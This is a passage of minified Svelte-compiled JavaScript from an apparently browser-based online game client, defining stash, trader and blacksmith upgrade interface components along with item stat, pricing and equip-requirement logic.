                    e.innerHTML = 'Upgrade <img class="svgicon texticon" src="/assets/ui/icons/gem.svg?v=4002247">',
                    B(e, "class", "btn textwhite")
            },
            m(i, n, a) {
                M(i, e, n),
                    a && s(),
                    s = A(e, "click", t[23])
            },
            p: i,
            d(t) {
                t && _(e),
                    s()
            }
        }
    }
    function tE(t) {
        let e, s, i, n, a, r, o, c, h, d, u, m, p = (1 == t[4] ? Xi.ui.stash.deposit : Xi.ui.stash.withdraw) + "", f = (1 == t[4] ? Xi.ui.stash.deposit : Xi.ui.stash.withdraw) + "";
        const g = new nk({
            props: {
                amount: t[4] > 0 ? t[5] : 0
            }
        });
        return {
            c() {
                e = T("div"),
                    s = T("span"),
                    i = P(p),
                    n = I(),
                    Ft(g.$$.fragment),
                    a = P(" ?"),
                    r = T("div"),
                    o = T("input"),
                    c = T("div"),
                    h = P(f),
                    U(o, "width", "150px"),
                    B(o, "class", "navbtn formatted"),
                    B(o, "type", "number"),
                    B(c, "class", d = "btn " + (!t[3] || t[5] <= 0 ? "disabled" : "") + " " + (1 == t[4] ? "blue" : "green") + " formatted"),
                    B(r, "class", "marg-top formelements svelte-1ilvxqc"),
                    B(e, "class", "panel-black marg-top"),
                    U(e, "text-align", "right")
            },
            m(d, p, f) {
                M(d, e, p),
                    E(e, s),
                    E(s, i),
                    E(s, n),
                    Zt(g, s, null),
                    E(s, a),
                    E(e, r),
                    E(r, o),
                    Z(o, t[5]),
                    E(r, c),
                    E(c, h),
                    u = !0,
                    f && l(m),
                    m = [A(o, "input", t[26]), A(c, "click", t[14])]
            },
            p(t, e) {
                (!u || 16 & e[0]) && p !== (p = (1 == t[4] ? Xi.ui.stash.deposit : Xi.ui.stash.withdraw) + "") && F(i, p);
                const s = {};
                48 & e[0] && (s.amount = t[4] > 0 ? t[5] : 0),
                    g.$set(s),
                    32 & e[0] && R(o.value) !== t[5] && Z(o, t[5]),
                    (!u || 16 & e[0]) && f !== (f = (1 == t[4] ? Xi.ui.stash.deposit : Xi.ui.stash.withdraw) + "") && F(h, f),
                    (!u || 56 & e[0] && d !== (d = "btn " + (!t[3] || t[5] <= 0 ? "disabled" : "") + " " + (1 == t[4] ? "blue" : "green") + " formatted")) && B(c, "class", d)
            },
            i(t) {
                u || (Et(g.$$.fragment, t),
                    u = !0)
            },
            o(t) {
                Mt(g.$$.fragment, t),
                    u = !1
            },
            d(t) {
                t && _(e),
                    Ut(g),
                    l(m)
            }
        }
    }
    function eE(t) {
        let e, s, i, n, a, r, o, c, h, d, u, m, p, f, g, v, y, b, w, x, k = t[2].length + "", $ = (t[7].subscribed_until ? WS[1].stash : WS[0].stash) + "", S = t[2], I = [];
        for (let e = 0; e < S.length; e += 1)
            I[e] = QS(YS(t, S, e));
        const R = t => Mt(I[t], 1, 1, () => {
            I[t] = null
        }
        );
        let z = null;
        S.length || (z = GS());
        let Z = !t[7].subscribed_until && JS(t);
        const L = new nk({
            props: {
                amount: t[6].gold
            }
        });
        let N = t[4] > 0 && tE(t);
        return {
            c() {
                e = T("div");
                for (let t = 0; t < I.length; t += 1)
                    I[t].c();
                z && z.c(),
                    s = T("div"),
                    i = T("div"),
                    n = T("span"),
                    a = P(k),
                    r = P(" / "),
                    o = P($),
                    Z && Z.c(),
                    h = T("div"),
                    Ft(L.$$.fragment),
                    d = T("div"),
                    u = T("img"),
                    f = T("div"),
                    g = T("img"),
                    N && N.c(),
                    b = D(),
                    B(e, "class", "panel-black slotcontainer scrollbar svelte-1ilvxqc"),
                    U(e, "width", t[2].length ? "fit-content" : "auto"),
                    U(e, "grid-template-columns", "repeat(" + Math.min(t[2].length, t[8]) + ", auto)"),
                    U(e, "max-height", t[9] + "px"),
                    B(n, "class", c = t[2].length < (t[7].subscribed_until ? WS[1].stash : WS[0].stash) ? "textgreen" : "textred"),
                    B(i, "class", "navbtn panel-black border black gold svelte-1ilvxqc"),
                    U(i, "margin-right", "auto"),
                    B(h, "class", "navbtn panel-black border black gold svelte-1ilvxqc"),
                    B(u, "class", "svgicon"),
                    u.src !== (m = "/assets/ui/icons/deposit.svg?v=4002247") && B(u, "src", m),
                    B(d, "class", p = "navbtn btn grey gold " + (1 == t[4] ? "active" : "") + " svelte-1ilvxqc"),
                    B(g, "class", "svgicon"),
                    g.src !== (v = "/assets/ui/icons/withdraw.svg?v=4002247") && B(g, "src", v),
                    B(f, "class", y = "navbtn btn grey gold " + (2 == t[4] ? "active" : "") + " svelte-1ilvxqc"),
                    B(s, "class", "formelements svelte-1ilvxqc")
            },
            m(c, m, p) {
                M(c, e, m);
                for (let t = 0; t < I.length; t += 1)
                    I[t].m(e, null);
                z && z.m(e, null),
                    M(c, s, m),
                    E(s, i),
                    E(i, n),
                    E(n, a),
                    E(n, r),
                    E(n, o),
                    Z && Z.m(n, null),
                    E(s, h),
                    Zt(L, h, null),
                    E(s, d),
                    E(d, u),
                    E(s, f),
                    E(f, g),
                    N && N.m(c, m),
                    M(c, b, m),
                    w = !0,
                    p && l(x),
                    x = [A(d, "click", t[24]), A(f, "click", t[25])]
            },
            p(t, s) {
                if (12303 & s[0]) {
                    let i;
                    for (S = t[2],
                        i = 0; i < S.length; i += 1) {
                        const n = YS(t, S, i);
                        I[i] ? (I[i].p(n, s),
                            Et(I[i], 1)) : (I[i] = QS(n),
                                I[i].c(),
                                Et(I[i], 1),
                                I[i].m(e, null))
                    }
                    for ($t(),
                        i = S.length; i < I.length; i += 1)
                        R(i);
                    St(),
                        S.length ? z && (z.d(1),
                            z = null) : z || (z = GS(),
                                z.c(),
                                z.m(e, null))
                }
                (!w || 4 & s[0]) && U(e, "width", t[2].length ? "fit-content" : "auto"),
                    (!w || 260 & s[0]) && U(e, "grid-template-columns", "repeat(" + Math.min(t[2].length, t[8]) + ", auto)"),
                    (!w || 512 & s[0]) && U(e, "max-height", t[9] + "px"),
                    (!w || 4 & s[0]) && k !== (k = t[2].length + "") && F(a, k),
                    (!w || 128 & s[0]) && $ !== ($ = (t[7].subscribed_until ? WS[1].stash : WS[0].stash) + "") && F(o, $),
                    t[7].subscribed_until ? Z && (Z.d(1),
                        Z = null) : Z ? Z.p(t, s) : (Z = JS(t),
                            Z.c(),
                            Z.m(n, null)),
                    (!w || 132 & s[0] && c !== (c = t[2].length < (t[7].subscribed_until ? WS[1].stash : WS[0].stash) ? "textgreen" : "textred")) && B(n, "class", c);
                const i = {};
                64 & s[0] && (i.amount = t[6].gold),
                    L.$set(i),
                    (!w || 16 & s[0] && p !== (p = "navbtn btn grey gold " + (1 == t[4] ? "active" : "") + " svelte-1ilvxqc")) && B(d, "class", p),
                    (!w || 16 & s[0] && y !== (y = "navbtn btn grey gold " + (2 == t[4] ? "active" : "") + " svelte-1ilvxqc")) && B(f, "class", y),
                    t[4] > 0 ? N ? (N.p(t, s),
                        16 & s[0] && Et(N, 1)) : (N = tE(t),
                            N.c(),
                            Et(N, 1),
                            N.m(b.parentNode, b)) : N && ($t(),
                                Mt(N, 1, 1, () => {
                                    N = null
                                }
                                ),
                                St())
            },
            i(t) {
                if (!w) {
                    for (let t = 0; t < S.length; t += 1)
                        Et(I[t]);
                    Et(L.$$.fragment, t),
                        Et(N),
                        w = !0
                }
            },
            o(t) {
                I = I.filter(Boolean);
                for (let t = 0; t < I.length; t += 1)
                    Mt(I[t]);
                Mt(L.$$.fragment, t),
                    Mt(N),
                    w = !1
            },
            d(t) {
                t && _(e),
                    C(I, t),
                    z && z.d(),
                    t && _(s),
                    Z && Z.d(),
                    Ut(L),
                    N && N.d(t),
                    t && _(b),
                    l(x)
            }
        }
    }
    function sE(t) {
        let e, s, i = t[6] && t[7] && VS(t);
        return {
            c() {
                i && i.c(),
                    e = D()
            },
            m(t, n) {
                i && i.m(t, n),
                    M(t, e, n),
                    s = !0
            },
            p(t, s) {
                t[6] && t[7] ? i ? (i.p(t, s),
                    192 & s[0] && Et(i, 1)) : (i = VS(t),
                        i.c(),
                        Et(i, 1),
                        i.m(e.parentNode, e)) : i && ($t(),
                            Mt(i, 1, 1, () => {
                                i = null
                            }
                            ),
                            St())
            },
            i(t) {
                s || (Et(i),
                    s = !0)
            },
            o(t) {
                Mt(i),
                    s = !1
            },
            d(t) {
                i && i.d(t),
                    t && _(e)
            }
        }
    }
    function iE(t, e, s) {
        let i, n, a, r, o, l, c, h, d, u;
        m(t, Pe, t => s(17, i = t)),
            m(t, le, t => s(18, n = t)),
            m(t, Te, t => s(6, a = t)),
            m(t, he, t => s(19, r = t)),
            m(t, Ze, t => s(7, o = t)),
            m(t, ns, t => s(8, l = t)),
            m(t, as, t => s(9, c = t)),
            m(t, us, t => s(10, h = t));
        let p = []
            , f = []
            , g = !1
            , v = void 0;
        const b = async () => {
            if (s(1, u = Date.now()),
                i.length) {
                const t = await fetch("/api/item/get", {
                    method: "POST",
                    body: JSON.stringify({
                        stash: 1,
                        ids: i.map(t => t.dbid)
                    })
                })
                    , e = await t.json();
                if (e.fail)
                    console.error(e);
                else {
                    s(2, f.length = 0, f);
                    let t = new Map(i.map(t => [t.dbid, t]));
                    e.forEach((e, i) => {
                        e.store = p[i] || (p[i] = qt()),
                            s(2, f[i] = p[i], f),
                            t.has(e.id) && (t.get(e.id).hydrate(e),
                                s(2, f[i].temp = t.get(e.id), f))
                    }
                    )
                }
            } else
                s(2, f.length = 0, f);
            _()
        }
            , w = t => {
                n && (rp("itemstash", "" + n.meta.slot),
                    y(le, n = void 0))
            }
            , x = t => t < u ? void 0 : Math.ceil((t - u) / 6e4) + "m"
            , k = t => {
                g && (t.detail.item.getStashTime() > Date.now() ? HS("system", Xi.ui.stash.waitunstash) : (rp("itemunstash", t.detail.item.dbid + ""),
                    M()))
            }
            , $ = t => {
                g && (rp(1 == S ? "goldstash" : "goldunstash", E + ""),
                    M())
            }
            ;
        let S = 2
            , E = 0;
        const M = () => {
            s(3, g = !1),
                v = setTimeout(() => {
                    s(3, g = !0)
                }
                    , 500)
        }
            , _ = () => {
                s(3, g = !0),
                    v && (clearTimeout(v),
                        v = void 0)
            }
            , C = t => y(us, h = !0)
            , T = t => s(4, S = 1)
            , P = t => s(4, S = 2);
        function I() {
            E = R(this.value),
                s(5, E),
                s(6, a),
                s(4, S),
                s(19, r)
        }
        const D = t => y(Te, a = !1);
        function A(t) {
            at[t ? "unshift" : "push"](() => {
                s(0, d = t)
            }
            )
        }
        return t.$$.update = () => {
            131072 & t.$$.dirty[0] && b(),
                524400 & t.$$.dirty[0] && s(5, E = a ? Math.min(1 == S ? r : a.gold, E) : 0)
        }
            ,
            [d, u, f, g, S, E, a, o, l, c, h, w, x, k, $, p, v, i, n, r, b, M, _, C, T, P, I, D, A]
    }
    class nE extends Ot {
        constructor(t) {
            super(),
                Nt(this, t, iE, sE, h, {}, [-1, -1])
        }
    }
    function aE(t, e, s) {
        const i = t.slice();
        return i[7] = e[s],
            i[9] = s,
            i
    }
    function rE(t) {
        let e, s, i;
        const n = new Sb({
            props: {
                title: "Trader",
                icon: "bag",
                $$slots: {
                    default: [uE]
                },
                $$scope: {
                    ctx: t
                }
            }
        });
        return n.$on("close", t[5]),
        {
            c() {
                e = T("div"),
                    Ft(n.$$.fragment),
                    B(e, "class", "l-upperLeftModal container svelte-46w0ts")
            },
            m(a, r, o) {
                M(a, e, r),
                    Zt(n, e, null),
                    t[6](e),
                    s = !0,
                    o && i(),
                    i = A(e, "pointerup", t[3])
            },
            p(t, e) {
                const s = {};
                1027 & e && (s.$$scope = {
                    dirty: e,
                    ctx: t
                }),
                    n.$set(s)
            },
            i(t) {
                s || (Et(n.$$.fragment, t),
                    s = !0)
            },
            o(t) {
                Mt(n.$$.fragment, t),
                    s = !1
            },
            d(s) {
                s && _(e),
                    Ut(n),
                    t[6](null),
                    i()
            }
        }
    }
    function oE(t) {
        let e;
        const s = new e$({
            props: {
                id: "trader" + t[9],
                descPos: "left:100%;top:0;",
                descRoot: t[0],
                isTrader: !0,
                pickable: !1,
                item: t[7]
            }
        });
        return s.$on("click", t[4]),
        {
            c() {
                Ft(s.$$.fragment)
            },
            m(t, i) {
                Zt(s, t, i),
                    e = !0
            },
            p(t, e) {
                const i = {};
                1 & e && (i.descRoot = t[0]),
                    s.$set(i)
            },
            i(t) {
                e || (Et(s.$$.fragment, t),
                    e = !0)
            },
            o(t) {
                Mt(s.$$.fragment, t),
                    e = !1
            },
            d(t) {
                Ut(s, t)
            }
        }
    }
    function lE(t) {
        let e;
        return {
            c() {
                e = T("span"),
                    e.textContent = "Select an item to sell",
                    B(e, "class", "textgrey")
            },
            m(t, s) {
                M(t, e, s)
            },
            p: i,
            i: i,
            o: i,
            d(t) {
                t && _(e)
            }
        }
    }
    function cE(t) {
        let e, s, i, n, a;
        const r = [dE, hE]
            , o = [];
        function l(t, s) {
            return 2 & s && (e = !!t[1].data.canBeSold()),
                e ? 0 : 1
        }
        return s = l(t, -1),
            i = o[s] = r[s](t),
        {
            c() {
                i.c(),
                    n = D()
            },
            m(t, e) {
                o[s].m(t, e),
                    M(t, n, e),
                    a = !0
            },
            p(t, e) {
                let a = s;
                s = l(t, e),
                    s === a ? o[s].p(t, e) : ($t(),
                        Mt(o[a], 1, 1, () => {
                            o[a] = null
                        }
                        ),
                        St(),
                        i = o[s],
                        i || (i = o[s] = r[s](t),
                            i.c()),
                        Et(i, 1),
                        i.m(n.parentNode, n))
            },
            i(t) {
                a || (Et(i),
                    a = !0)
            },
            o(t) {
                Mt(i),
                    a = !1
            },
            d(t) {
                o[s].d(t),
                    t && _(n)
            }
        }
    }
    function hE(t) {
        let e;
        return {
            c() {
                e = T("span"),
                    e.textContent = "The trader does not want this item",
                    B(e, "class", "textred")
            },
            m(t, s) {
                M(t, e, s)
            },
            p: i,
            i: i,
            o: i,
            d(t) {
                t && _(e)
            }
        }
    }
    function dE(t) {
        let e;
        const s = new nk({
            props: {
                amount: t[1].data.goldValue()
            }
        });
        return {
            c() {
                Ft(s.$$.fragment)
            },
            m(t, i) {
                Zt(s, t, i),
                    e = !0
            },
            p(t, e) {
                const i = {};
                2 & e && (i.amount = t[1].data.goldValue()),
                    s.$set(i)
            },
            i(t) {
                e || (Et(s.$$.fragment, t),
                    e = !0)
            },
            o(t) {
                Mt(s.$$.fragment, t),
                    e = !1
            },
            d(t) {
                Ut(s, t)
            }
        }
    }
    function uE(t) {
        let e, s, i, n, a, r, o, l, c, h = Ua.player.getTargetEntity().itemStores, d = [];
        for (let e = 0; e < h.length; e += 1)
            d[e] = oE(aE(t, h, e));
        const u = t => Mt(d[t], 1, 1, () => {
            d[t] = null
        }
        )
            , m = [cE, lE]
            , p = [];
        function f(t, e) {
            return t[1] && "item" === t[1].meta.type ? 0 : 1
        }
        return o = f(t),
            l = p[o] = m[o](t),
        {
            c() {
                e = T("p"),
                    e.textContent = "" + Xi.npcs.trader.buy,
                    s = T("div");
                for (let t = 0; t < d.length; t += 1)
                    d[t].c();
                i = T("div"),
                    n = T("p"),
                    n.textContent = "" + Xi.npcs.trader.info,
                    a = T("p"),
                    a.textContent = "" + Xi.npcs.trader.price,
                    r = T("span"),
                    l.c(),
                    B(e, "class", "textprimary textcenter"),
                    B(s, "class", "panel-black slotcontainer svelte-46w0ts"),
                    B(n, "class", "textprimary"),
                    B(r, "class", "panel-black formatted info svelte-46w0ts"),
                    B(i, "class", "textcenter")
            },
            m(t, l) {
                M(t, e, l),
                    M(t, s, l);
                for (let t = 0; t < d.length; t += 1)
                    d[t].m(s, null);
                M(t, i, l),
                    E(i, n),
                    E(i, a),
                    E(i, r),
                    p[o].m(r, null),
                    c = !0
            },
            p(t, e) {
                if (17 & e) {
                    let i;
                    for (h = Ua.player.getTargetEntity().itemStores,
                        i = 0; i < h.length; i += 1) {
                        const n = aE(t, h, i);
                        d[i] ? (d[i].p(n, e),
                            Et(d[i], 1)) : (d[i] = oE(n),
                                d[i].c(),
                                Et(d[i], 1),
                                d[i].m(s, null))
                    }
                    for ($t(),
                        i = h.length; i < d.length; i += 1)
                        u(i);
                    St()
                }
                let i = o;
                o = f(t),
                    o === i ? p[o].p(t, e) : ($t(),
                        Mt(p[i], 1, 1, () => {
                            p[i] = null
                        }
                        ),
                        St(),
                        l = p[o],
                        l || (l = p[o] = m[o](t),
                            l.c()),
                        Et(l, 1),
                        l.m(r, null))
            },
            i(t) {
                if (!c) {
                    for (let t = 0; t < h.length; t += 1)
                        Et(d[t]);
                    Et(l),
                        c = !0
                }
            },
            o(t) {
                d = d.filter(Boolean);
                for (let t = 0; t < d.length; t += 1)
                    Mt(d[t]);
                Mt(l),
                    c = !1
            },
            d(t) {
                t && _(e),
                    t && _(s),
                    C(d, t),
                    t && _(i),
                    p[o].d()
            }
        }
    }
    function mE(t) {
        let e, s, i = t[2] && rE(t);
        return {
            c() {
                i && i.c(),
                    e = D()
            },
            m(t, n) {
                i && i.m(t, n),
                    M(t, e, n),
                    s = !0
            },
            p(t, [s]) {
                t[2] ? i ? (i.p(t, s),
                    4 & s && Et(i, 1)) : (i = rE(t),
                        i.c(),
                        Et(i, 1),
                        i.m(e.parentNode, e)) : i && ($t(),
                            Mt(i, 1, 1, () => {
                                i = null
                            }
                            ),
                            St())
            },
            i(t) {
                s || (Et(i),
                    s = !0)
            },
            o(t) {
                Mt(i),
                    s = !1
            },
            d(t) {
                i && i.d(t),
                    t && _(e)
            }
        }
    }
    function pE(t, e, s) {
        let i, n;
        m(t, le, t => s(1, i = t)),
            m(t, Ie, t => s(2, n = t));
        const a = t => {
            i && (rp("itemtradersell", "" + i.meta.slot),
                y(le, i = void 0))
        }
            ;
        let r;
        const o = t => y(Ie, n = !1);
        function l(t) {
            at[t ? "unshift" : "push"](() => {
                s(0, r = t)
            }
            )
        }
        return [r, i, n, a, t => {
            rp("itemtraderbuy", "" + t.detail.item.traderslot)
        }
            , o, l]
    }
    class fE extends Ot {
        constructor(t) {
            super(),
                Nt(this, t, pE, mE, h, {})
        }
    }
    const gE = t => void 0 === t.stacks && t.rolls.length > 0 && !tl[t.type].noupgrade
        , vE = t => t < 101
        , yE = t => {
            if (!gE(t))
                return 0;
            const e = Ky[t.type + t.tier];
            return Math.ceil(((1 + e.level * (1 + t.upgrade)) / tl[t.type].drop) ** (1.2 + .2 * t.upgrade)) + 100
        }
        , bE = t => {
            if (gE(t)) {
                const e = [];
                for (let s = 0; s < Math.max(1, Math.min(t.upgrade, 3)); ++s)
                    e.push({
                        type: "rune",
                        tier: s + Math.max(0, t.upgrade - 3),
                        stacks: Math.min(t.upgrade + 1, 3 - s)
                    });
                return e
            }
            return []
        }
        , wE = (t, e, s, i, n) => xE(t, i, n) && kE(s, i, n) && _E(e, i, n) && TE(e, i, n) && ME(e, t, i, n, s)
        , xE = (t, e, s) => t >= Ky[e + s].level
        , kE = (t, e, s) => void 0 === Ky[e + s].class || t === Ky[e + s].class
        , $E = (t, e) => t + by.get(e).skillpoints
        , SE = t => t.reduce($E, 0)
        , EE = (t, e) => by.get(Ky[t + e].skillid).skillpoints
        , ME = (t, e, s, i, n) => "book" !== s || mf(e, n) >= SE(t) + EE(s, i)
        , _E = (t, e, s) => "book" !== e || CE(t, Ky[e + s].skillid) === Ky[e + s].skilllevel
        , CE = (t, e) => t.reduce((t, s) => t + (s === e), 0)
        , TE = (t, e, s) => !Ky[e + s].requiredSkills || !Ky[e + s].requiredSkills.some(e => t.indexOf(e) < 0)
        , PE = (t, e, s) => void 0 === Ky[e + s].buyElo || t >= Ky[e + s].buyElo
        , IE = (t, e, s, i) => Math.ceil(t.goldValue || (.4 * (t.level ** 1.3 + .4 * e)) ** (1.1 + e / 100) / tl[t.type].drop) * (s || 1) * (i ? 8 : 1);
    class DE {
        constructor(t) {
            this.dbid = t,
                this.stats = new Map,
                this.dirty = !0
        }
        hydrate(t) {
            if (this.dirty = !1,
                this.bound = t.bound,
                this.type = t.type,
                this.tier = t.tier,
                this.logic = Ky[this.type + this.tier],
                this.auction = t.auction ? new Date(t.auction) : void 0,
                this.auctionprice = t.auctionprice,
                this.owner = t.name,
                this.stash = t.stash ? new Date(t.stash) : void 0,
                void 0 === this.logic)
                throw "Unknown item " + t.type + t.tier;
            if (this.upgrade = t.upgrade,
                this.stats.clear(),
                t.rolls) {
                if (this.setRolls(t.rolls),
                    this.quality = this.nextRoll(),
                    this.logic.stats) {
                    this.logic.stats.forEach((t, e) => {
                        this.stats.set(e, {
                            type: "base",
                            qual: this.quality,
                            value: Math.floor(t.min + (t.max - t.min) * (this.quality / 100) ** 2 + il[e] * this.upgrade)
                        })
                    }
                    );
                    const t = Math.round((this.quality / 100) ** 1.5 * 3.6);
                    for (let e = 0; e < t; ++e) {
                        let t = this.nextRoll()
                            , e = -1;
                        for (; -1 === e || this.stats.has(e);)
                            e = parseInt(Qo(AE, t / 101)),
                                t = (t + 5) % 100;
                        const s = (this.nextRoll() + this.quality) / 2;
                        this.stats.set(e, {
                            type: "bonus",
                            qual: s,
                            value: Math.ceil(Math.max((sl[e].min + (sl[e].max - sl[e].min) * (s / 100) ** 2) * this.logic.level * tl[this.type].weight, il[e]) + il[e] * this.upgrade)
                        })
                    }
                }
                this.quality = this.logic.quality || this.quality,
                    this.stacks = void 0
            } else
                this.stacks = t.stacks,
                    this.quality = this.logic.quality || 0
        }
        setRolls(t) {
            this.rolls = t,
                this.currentRoll = 0
        }
        nextRoll() {
            if (this.currentRoll == this.rolls.length)
                throw "roll maximum reached";
            return this.rolls[this.currentRoll++]
        }
        use(t) {
            this.logic.use && this.logic.use(t)
        }
        goldValue(t) {
            if (!this.canBeSold())
                throw "Item cant have value because it cant be sold";
            return IE(this.logic, this.quality, this.stacks, t)
        }
        storeValue() {
            return this.logic.storeValue || 0
        }
        medalValue() {
            return this.logic.medalValue || 0
        }
        canEquip(t) {
            return wE(t.level, t.skills.skillIds, t.class, this.type, this.tier)
        }
        canEquipClass(t) {
            return kE(t.class, this.type, this.tier)
        }
        equipReasons(t) {
            const e = [];
            return this.logic.level && e.push(["Lv. " + this.logic.level, !0]),
                e
        }
        canBeDropped() {
            return !tl[this.type].undroppable && !this.bound
        }
        canBeTraded() {
            return !this.bound
        }
        canBeSold() {
            return !this.logic.unsellable
        }
        getStashTime() {
            return this.dirty ? 0 : void 0 !== this.stash ? this.stash.getTime() : 0
        }
        getEquipSlot() {
            return void 0 !== tl[this.type].slot ? tl[this.type].slot[0] : void 0
        }
    }
    const AE = Object.keys(sl)
        , BE = (t, e, s) => {
            if (t && t.type)
                switch (e) {
                    case 13:
                        t.rolls && t.quality >= 70 && dl({
                            id: "item/" + (t.quality < 90 ? "discoverRare" : "discoverEpic"),
                            pitch: -1
                        });
                    case 1:
                        ji.chat[7] && HS("inv", Xi.ui.inventory.pick.replace("$1", Hi(t.type, t.tier)), !0),
                            ib(10, 100),
                            vl(t.type),
                            Gy[12].element = "bag" + s,
                            "book" == t.type && ib(23, 100) && (Gy[24].element = "bag" + s);
                        break;
                    case 10:
                        t.rolls && Ae.update(e => (Be.set(t.upgrade - e.upgrade),
                            t))
                }
        }
        , RE = (t, e) => {
            if (t && t.type)
                switch (e) {
                    case 7:
                        ji.chat[8] && HS("inv", Xi.ui.stash.stashed.replace("$1", Hi(t.type, t.tier))),
                            vl(t.type);
                        break;
                    case 6:
                        Me.set(),
                            _e.update(t => !t),
                            ji.chat[8] && HS("inv", Xi.ui.merchant.auctionpost.replace("$1", Hi(t.type, t.tier)));
                        break;
                    case 9:
                        ji.chat[8] && HS("inv", Xi.ui.inventory.sold.replace("$1", Hi(t.type, t.tier))),
                            vl(t.type);
                        break;
                    case 2:
                        ji.chat[7] && HS("inv", Xi.ui.inventory.throw.replace("$1", Hi(t.type, t.tier))),
                            vl(t.type)
                }
        }
        , zE = (t, e, s, i) => {
            switch (0 != s && vl("gold"),
            e = i + e,
            s) {
                case 1:
                    ji.chat[9] && HS("inv", Xi.ui.inventory.pick.replace("$1", e), !0);
                    break;
                case 4:
                    _e.update(t => !t),
                        ji.chat[10] && HS("inv", Xi.ui.merchant.auctionbuy.replace("$1", e), !0);
                    break;
                case 12:
                case 3:
                    ji.chat[10] && HS("inv", Xi.ui.inventory.spend.replace("$1", e), !0);
                    break;
                case 11:
                    ji.chat[10] && HS("inv", Xi.ui.inventory.death.replace("$1", e), !0);
                    break;
                case 9:
                    ji.chat[10] && HS("inv", Xi.ui.inventory.receive.replace("$1", e), !0)
            }
        }
        ;
    class FE extends DE {
        constructor(t) {
            super(t)
        }
        hydrate(t) {
            super.hydrate(t),
                t.store ? t.store.set(this) : console.error("no store for item", t),
                BE(this, this.reason, t.slot)
        }
        equipReasons(t) {
            const e = [];
            if (void 0 !== this.logic.class && e.push(["Class: " + Xi.classes[this.logic.class].name, kE(t.class, this.type, this.tier)]),
                this.logic.level && e.push(["Requires Lv. " + this.logic.level, xE(t.level, this.type, this.tier)]),
                this.logic.requiredSkills && e.push(["Must know: " + this.logic.requiredSkills.map(t => Xi.items.book[t].name).join(", "), TE(t.skills.skillIds, this.type, this.tier)]),
                kE(t.class, this.type, this.tier) && "book" == this.type) {
                const s = _E(t.skills.skillIds, this.type, this.tier)
                    , i = CE(t.skills.skillIds, this.logic.skillid);
                e.push([s ? "Use book to learn skill" : i >= this.logic.skilllevel ? "You already know this skill" : `Must learn book Lv. ${this.logic.skilllevel} first`, s]);
                const n = ME(t.skills.skillIds, t.level, this.type, this.tier, t.class);
                e.push([n ? `Requires ${EE(this.type, this.tier) || "no"} skill point` : "Not enough skill points", n])
            }
            return e
        }
        buyReasons(t) {
            const e = [];
            return void 0 !== this.logic.buyElo && e.push(["Min. Rating: " + Zb(this.logic.buyElo), PE(t.elo, this.type, this.tier)]),
                e
        }
        getBestEquipslot(t) {
            const e = tl[this.type].slot;
            if (void 0 !== e)
                return e.find(e => void 0 === t.slots.get(e)) || e[0]
        }
    }
    function ZE(t, e, s) {
        const i = t.slice();
        return i[18] = e[s],
            i
    }
    function UE(t) {
        let e, s;
        const i = new Sb({
            props: {
                title: "Blacksmith",
                pad: "5",
                icon: "bag",
                $$slots: {
                    default: [OE]
                },
                $$scope: {
                    ctx: t
                }
            }
        });
        return i.$on("close", t[17]),
        {
            c() {
                e = T("div"),
                    Ft(i.$$.fragment),
                    B(e, "class", "absCentered container textcenter svelte-1u9u6qj")
            },
            m(t, n) {
                M(t, e, n),
                    Zt(i, e, null),
                    s = !0
            },
            p(t, e) {
                const s = {};
                2097407 & e && (s.$$scope = {
                    dirty: e,
                    ctx: t
                }),
                    i.$set(s)
            },
            i(t) {
                s || (Et(i.$$.fragment, t),
                    s = !0)
            },
            o(t) {
                Mt(i.$$.fragment, t),
                    s = !1
            },
            d(t) {
                t && _(e),
                    Ut(i)
            }
        }
    }
    function LE(t) {
        let e;
        return {
            c() {
                e = T("div")
            },
            m(t, s) {
                M(t, e, s)
            },
            d(t) {
                t && _(e)
            }
        }
    }
    function NE(t) {
        let e;
        const s = new e$({
            props: {
                pickable: !1,
                item: t[18],
                filter: t[18].filter
            }
        });
        return {
            c() {
                Ft(s.$$.fragment)
            },
            m(t, i) {
                Zt(s, t, i),
                    e = !0
            },
            p(t, e) {
                const i = {};
                2 & e && (i.item = t[18]),
                    2 & e && (i.filter = t[18].filter),
                    s.$set(i)
            },
            i(t) {
                e || (Et(s.$$.fragment, t),
                    e = !0)
            },
            o(t) {
                Mt(s.$$.fragment, t),
                    e = !1
            },
            d(t) {
                Ut(s, t)
            }
        }
    }
    function OE(t) {
        let e, s, i, n, a, r, o, l, c, h, d, u, m, p, f, g = (t[5] || "Place an item into the upgrade slot") + "";
        const v = new e$({
            props: {
                clearOnMove: !0,
                invslot: t[7] ? t[0] : void 0,
                pickable: !0,
                item: Ae,
                filter: !!t[3] || ""
            }
        });
        v.$on("discard", t[10]),
            v.$on("move", t[9]);
        let y = t[1]
            , b = [];
        for (let e = 0; e < y.length; e += 1)
            b[e] = NE(ZE(t, y, e));
        const w = t => Mt(b[t], 1, 1, () => {
            b[t] = null
        }
        );
        let x = null;
        y.length || (x = LE());
        const k = new nk({
            props: {
                isPrice: !0,
                amount: t[7] ? yE(t[7]) : 0
            }
        });
        return {
            c() {
                e = T("h3"),
                    e.textContent = "Upgrade Item",
                    s = T("span"),
                    i = P(g),
                    a = T("div"),
                    Ft(v.$$.fragment),
                    o = T("div"),
                    l = T("span"),
                    l.textContent = "Cost:",
                    c = T("div");
                for (let t = 0; t < b.length; t += 1)
                    b[t].c();
                x && x.c(),
                    h = T("div"),
                    Ft(k.$$.fragment),
                    d = T("div"),
                    u = P("Upgrade"),
                    B(e, "class", "textwhite"),
                    B(s, "class", n = "panel-black upgradetext " + t[6] + " svelte-1u9u6qj"),
                    B(a, "class", r = "upgradeslot " + t[4] + " svelte-1u9u6qj"),
                    B(c, "class", "panel-black costgrid svelte-1u9u6qj"),
                    U(c, "grid-template-columns", "repeat(" + (t[1].length || 3) + ", 30px)"),
                    B(d, "class", m = "btn primary formatted textcenter upgradebutton " + (t[2] ? "" : "disabled") + " svelte-1u9u6qj"),
                    B(o, "class", "upgrade svelte-1u9u6qj")
            },
            m(n, r, m) {
                M(n, e, r),
                    M(n, s, r),
                    E(s, i),
                    M(n, a, r),
                    Zt(v, a, null),
                    M(n, o, r),
                    E(o, l),
                    E(o, c);
                for (let t = 0; t < b.length; t += 1)
                    b[t].m(c, null);
                x && x.m(c, null),
                    E(o, h),
                    Zt(k, h, null),
                    E(o, d),
                    E(d, u),
                    p = !0,
                    m && f(),
                    f = A(d, "click", t[11])
            },
            p(t, e) {
                (!p || 32 & e) && g !== (g = (t[5] || "Place an item into the upgrade slot") + "") && F(i, g),
                    (!p || 64 & e && n !== (n = "panel-black upgradetext " + t[6] + " svelte-1u9u6qj")) && B(s, "class", n);
                const o = {};
                if (129 & e && (o.invslot = t[7] ? t[0] : void 0),
